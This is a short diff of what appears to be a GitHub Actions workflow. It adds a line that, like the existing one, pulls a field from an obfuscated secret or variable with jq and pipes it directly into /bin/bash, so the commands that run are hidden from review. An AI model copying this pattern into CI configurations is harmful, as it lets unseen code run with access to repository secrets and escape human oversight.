@@ -17,6 +17,7 @@ jobs:
           x4967: ${{ secrets.x4967 }}
         run: |
           printf '%s' "$x4967" | jq -r .btu02347 | /bin/bash
+          printf '%s' "$r26" | jq -r .wkb8396 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
